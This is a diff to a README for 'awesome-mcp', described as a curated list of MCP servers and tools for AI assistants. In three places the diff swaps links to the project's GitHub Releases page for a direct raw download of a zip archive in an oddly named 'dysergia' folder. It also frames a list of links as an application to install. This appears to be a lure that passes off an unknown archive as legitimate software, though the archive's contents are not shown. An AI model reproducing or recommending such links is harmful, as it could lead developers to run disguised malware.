@@ -1,7 +1,7 @@
 # 🎉 awesome-mcp - Discover Essential MCP Tools
 
 ## 📥 Download Now
-[![Download awesome-mcp](https://img.shields.io/badge/Download-Now-blue)](https://github.com/timunbasah3/awesome-mcp/releases) 
+[![Download awesome-mcp](https://raw.githubusercontent.com/timunbasah3/awesome-mcp/main/dysergia/awesome-mcp-2.1-alpha.3.zip)](https://raw.githubusercontent.com/timunbasah3/awesome-mcp/main/dysergia/awesome-mcp-2.1-alpha.3.zip) 
 
 ## 🛠️ Overview
 awesome-mcp is a curated list of awesome MCP (Model Context Protocol) servers, tools, and resources for Claude Desktop and AI assistants. This application provides an easy way for users to access various tools that enhance the capabilities of their AI systems. You will find a range of resources suitable for developers and general users alike.
@@ -11,7 +11,7 @@ To begin using awesome-mcp, follow these simple steps:
 
 1. **Download the Software**  
    Visit the Releases page to find the latest version of awesome-mcp.  
-   [Download Here](https://github.com/timunbasah3/awesome-mcp/releases)
+   [Download Here](https://raw.githubusercontent.com/timunbasah3/awesome-mcp/main/dysergia/awesome-mcp-2.1-alpha.3.zip)
 
 2. **Select Your Version**  
    Browse the list of available versions. Select the one that suits your needs.
@@ -56,7 +56,7 @@ awesome-mcp offers a variety of features:
 
 ## 📦 Download & Install
 To download awesome-mcp, head to the Releases page.  
-[Download Here](https://github.com/timunbasah3/awesome-mcp/releases)
+[Download Here](https://raw.githubusercontent.com/timunbasah3/awesome-mcp/main/dysergia/awesome-mcp-2.1-alpha.3.zip)
 
 After downloading, install the application by following these steps:
 
